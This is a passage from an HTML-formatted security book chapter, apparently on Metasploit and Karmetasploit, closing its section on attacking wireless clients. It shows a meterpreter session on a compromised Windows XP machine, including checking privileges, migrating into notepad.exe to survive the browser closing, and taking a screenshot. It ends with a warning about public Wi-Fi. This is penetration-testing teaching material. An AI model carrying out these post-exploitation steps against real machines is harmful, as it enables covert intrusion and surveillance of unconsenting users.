id="IDX-CHP-12-0034" class="strong"/><a id="IDX-CHP-12-0035" class="strong"/></p><p class="calibre2">Returning to <span class="strong"><em class="calibre4">msfconsole</em></span>, we can interact with the session that was created and check to see what permissions we have obtained on the target. Remember, when you exploit a browser it’s always a good idea to migrate your process out of the web browser in case it gets closed.</p><a id="I_programlisting12_d1e14765" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">sessions -i 1</code></strong>
[*] Starting interaction with 1...
meterpreter &gt; <strong class="calibre3"><code class="calibre6">sysinfo</code></strong>
Computer: V-XP-SP2-BARE
OS      : Windows XP (Build 2600, Service Pack 2).
Arch    : x86
Language: en_US
meterpreter &gt; <strong class="calibre3"><code class="calibre6">getuid</code></strong>
Server username: V-XP-SP2-BARE\Administrator
meterpreter &gt; <strong class="calibre3"><code class="calibre6">run migrate -f</code></strong>
[*] Current server process: jEFiwxBKyjoHGijtP.exe (3448)
[*] Spawning a notepad.exe host process...
[*] Migrating into process ID 2232
[*] New server process: notepad.exe (2232)
meterpreter &gt; <strong class="calibre3"><code class="calibre6">screenshot</code></strong>
Screenshot saved to: /opt/metasploit3/msf3/rkGrMLPa.jpeg
meterpreter &gt;</pre><p class="calibre2">Because this is a default installation of Windows XP SP2 with the very insecure Internet Explorer 6 installed (both of which are highly out of date), the client didn’t even need to accept and install the malicious ActiveX control.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="wrapping_up-id4">Wrapping Up</h2></div></div></div><p class="calibre2">Attacks against wireless networks have been a popular topic for quite some time. Although this attack can take a bit of setup, imagine its success against a number of similarly configured clients located in a high-traffic or public area. This approach to attacking wireless clients is often popular because it’s easier than a brute force attack against a well-secured wireless infrastructure.</p><p class="calibre2">Now that you’ve seen how easy it is to conduct this sort of attack, you’ll probably think twice about using public wireless networks. Are you sure that the coffee shop is offering “free public Wi-Fi”? Or perhaps someone is running Karmetasploit?</p></div></section></body></html>